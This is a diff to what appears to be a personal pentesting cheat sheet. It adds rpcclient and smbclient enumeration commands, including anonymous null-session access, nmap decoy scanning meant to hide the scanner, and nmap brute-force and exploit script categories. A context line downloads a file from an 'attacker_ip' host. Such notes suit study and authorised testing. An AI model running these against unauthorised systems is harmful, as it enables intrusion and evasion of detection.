@@ -1,4 +1,25 @@
 LINUX
+
+	RPCclient (MSRPC, administration tool)
+		rpcclient (FLAGS) {ip_address}
+			-U "domain/username%password"| to log in as a user (can leave blank if share isn't secured)
+		after connecting
+			srvinfo | display Server information
+			enumdomains | enumerate all domains in the network
+			querydominfo | provides domain, server and user information of deployed domains
+			netshareenumall | enumerate all available shares
+			netsharegetinfo <share> | provides info about a specific share
+			enumdomusers | enum all domain users
+			queryuser <RID> | provides info about a specific user
+
+	SMBclient (SMB)
+		smbclient (FLAGS) //{ip_address}
+			-N | null session, this lets you anonymously connect to a target's SMB share.
+			-L | lists all the server's shares
+		after connecting
+			!<cmd> to execute local system commands
+			help | to get all the commands you can run
+
 	Reverse Shells
 		python3 -m http.server 9000
 			wget http://attacker_ip:9000/file_path to download file to remote pc
@@ -115,9 +136,9 @@ LINUX
 				-m to set the http method (GET, POST)
 				-r follow redirects
 	NMap
-		nmap (IP)/24(FLAGS)
+		nmap (IP)/24 (FLAGS) (SCRIPTS)
 		FLAGS
-			-sn ping scan host (no ports only active)
+			-sn ping scan host (no ports, only active hosts)
 			-sL List Target IPs/names
 			-sT TCP connect, complete Handshake
 			-sS stealth scan, only 1st step of Handshake
@@ -131,12 +152,21 @@ LINUX
 			-v verbosity level (-v or -vv)
 			-oN {filename} -saves as normal output
 			-oG GREPable output
+			-D RND:xyz to set up decoy IP adresses. Your IP will be put in that pool of random IP Adresses. Combine it with a proxy.
 		TIMINGS
 			-T0 paranoid 9.8h for 100 most common ports (5 min between each port)
 			-T1 sneaky 27.53 min for 100p (15 sec between every 2 ports)
 			-T2 polite 40.56 sec for 100p (0.4 sec for every port)
 			-T3 normal 0.15 sec for 100p
 			-T4 aggressive 0.13 sec for 100p
+		SCRIPTS (categories)
+			Needs to always start with --script xyz
+			auth | Determination of authentication credentials.
+			brute | Executes scripts that try to log in to the respective service by brute-forcing with credentials.
+			discovery | Evaluation of accessible services.
+			exploit | This category of scripts tries to exploit known vulnerabilities for the scanned port.
+			version | Extension for service detection.
+			vuln | Identification of specific vulnerabilities.
 
 	Linux
 		ls (optional flags)
